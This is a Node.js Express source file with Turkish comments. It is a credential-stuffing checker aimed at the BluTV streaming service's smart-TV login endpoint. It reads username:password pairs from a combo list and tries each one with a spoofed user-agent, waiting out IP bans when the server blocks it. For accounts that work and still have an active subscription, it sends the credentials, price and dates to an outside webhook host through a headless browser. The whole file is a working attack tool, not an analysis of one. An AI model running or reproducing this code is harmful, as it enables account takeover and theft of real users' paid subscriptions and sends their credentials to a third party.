const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const moment = require('moment-timezone');
const puppeteer = require('puppeteer');
const app = express();

const webhookUrl = 'http://ferlinblutv.rf.gd/webhook.php'; // Webhook URL'si
let ipBan = false;

// 1 saniye beklemek için kullanılan fonksiyon
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// IP ban durumu için 10 dakika bekleme fonksiyonu
async function waitForIPBanLift() {
    console.log("IP ban yedi, 10 dakika bekleniyor...");
    await delay(10 * 60 * 1000); // 10 dakika bekleme (milisaniye cinsinden)
    ipBan = false;
    console.log("Bekleme sona erdi, taramaya devam ediliyor...");
}

async function sendHitToWebhook(username, password, price, startDate, endDate) {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    const url = `${webhookUrl}?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&price=${encodeURIComponent(price)}&start=${encodeURIComponent(startDate)}&end=${encodeURIComponent(endDate)}`;

    try {
        await page.goto(url, { waitUntil: 'networkidle2' });
        console.log(`Hit başarıyla webhook'a gönderildi: ${username}`);
    } catch (error) {
        console.error(`Webhook'a gönderme sırasında hata oluştu: ${error.message}`);
    } finally {
        await browser.close();
    }
}

app.get('/', async (req, res) => {
    const comboFilePath = 'combo.txt';
    let isScanning = true;

    try {
        const comboLines = fs.readFileSync(comboFilePath, 'utf-8').split('\n');
        const turkeyTimeNow = moment().tz("Europe/Istanbul").format("YYYY-MM-DD");

        for (let line of comboLines) {
            if (ipBan) {
                await waitForIPBanLift();  // IP ban durumunda bekleme
            }

            if (line.includes(':')) {
                const [username, password] = line.trim().split(':');

                const url = 'https://smarttv.blutv.com.tr/actions/account/login';
                const headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-encoding': 'gzip, deflate',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'user-agent': 'Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/535.42 (KHTML, like Gecko) Chrome/51.0.2492.278 Safari/601'
                };
                const data = new URLSearchParams({
                    'username': username,
                    'password': password,
                    'platform': 'com.blu.smarttv'
                });

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: headers,
                        body: data.toString()
                    });

                    // Yanıtın tamamını konsola yazdır
                    const responseText = await response.text();
                    console.log(`Yanıt: ${responseText}`);

                    // Eğer yanıt "403 Forbidden" içeriyorsa ban atla
                    if (responseText.includes('403 Forbidden')) {
                        console.log("IP ban tespit edildi! 403 Forbidden alındı.");
                        ipBan = true;
                        await waitForIPBanLift();
                        continue;
                    }

                    // Eğer yanıt JSON formatında değilse veya banlandıysanız hata atla
                    const contentType = response.headers.get('content-type');
                    if (!contentType || !contentType.includes('application/json')) {
                        console.error('Geçersiz yanıt: JSON formatı bekleniyor');
                        continue;
                    }

                    const jsonResponse = JSON.parse(responseText);

                    if (response.status === 200 && jsonResponse && jsonResponse.status === "ok") {
                        const userData = jsonResponse.user;
                        const startDateRaw = userData ? userData.StartDate : null;
                        const endDateRaw = userData ? userData.EndDate : null;
                        const price = userData ? userData.Price : 'Bilinmiyor';

                        if (!endDateRaw || endDateRaw === 'Bilinmiyor') {
                            console.log(`!Custom Hesap! - ${username}:${password}`);
                        } else {
                            const startDate = startDateRaw ? moment(startDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';
                            const endDate = endDateRaw ? moment(endDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';

                            if (moment(endDate).isBefore(turkeyTimeNow)) {
                                console.log(`!Custom Hesap! - ${username}:${password}`);
                            } else {
                                console.log(`!Hit Hesap! - ${username}:${password}`);
                                console.log(`Fiyat: ${price}`);
                                console.log(`Başlangıç Tarihi: ${startDate}`);
                                console.log(`Bitiş Tarihi: ${endDate}`);

                                // Hit'i webhook'a gönder
                                await sendHitToWebhook(username, password, price, startDate, endDate);
                            }
                        }
                    } else {
                        console.log(`Yanlış Hesap: ${username}:${password}`);
                    }
                } catch (error) {
                    console.error(`Hata oluştu: ${error.message}`);
                }

                // İlgili satırı combo.txt'den sil
                const updatedLines = comboLines.filter(comboLine => comboLine.trim() !== line.trim());
                fs.writeFileSync(comboFilePath, updatedLines.join('\n'));

                // Her isteğin ardından 1 saniye bekle
                await delay(1000);
            }
        }

        isScanning = false;
        res.json({ status: "success", message: "Tarama tamamlandı." });
    } catch (err) {
        isScanning = false;
        console.error("Dosya okunurken hata oluştu:", err);
        res.json({ status: "error", message: "Tarama sırasında hata oluştu." });
    }
});

app.get('/status', (req, res) => {
    if (isScanning) {
        res.json({ status: "success", message: "Tarama devam ediyor..." });
    } else {
        res.json({ status: "false", message: "Tarama durdu." });
    }
});

// Arka planda tarama başlasın
app.get('/start-scan', (req, res) => {
    res.send('<h1>Tarama başlatıldı. Sonuçlar alınıyor...</h1>');
    app.emit('start');
});

// Server başlatma
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server ${PORT} portunda çalışıyor.`);
    app.emit('start');
});
